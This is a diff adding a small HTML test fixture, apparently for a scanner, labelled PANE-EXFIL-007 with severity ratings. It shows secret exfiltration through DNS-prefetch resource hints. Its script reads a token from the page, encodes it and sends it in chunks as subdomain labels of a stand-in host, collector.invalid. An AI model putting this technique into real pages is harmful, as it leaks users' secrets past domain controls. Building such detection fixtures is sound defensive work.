@@ -1,0 +1,20 @@
+<!--
+  PANE-EXFIL-007. A resource hint needs no response body to leak: the DNS query
+  itself carries the payload, one label at a time.
+
+  The static hint is MEDIUM. The loop below is HIGH — an href built at runtime
+  from encoded secret material is a complete, if low-bandwidth, exfiltration
+  channel that no declared domain constrains.
+-->
+<link rel="dns-prefetch" href="https://collector.invalid">
+<link rel="preconnect" href="//collector.invalid">
+<script>
+  const secret = document.getElementById('token').textContent;
+  for (const chunk of chunks(base32(secret))) {
+    const l = document.createElement('link');
+    l.rel = 'dns-prefetch';
+    l.href = '//' + chunk + '.collector.invalid';
+    document.head.appendChild(l);
+  }
+</script>
+<span id="token">t</span>
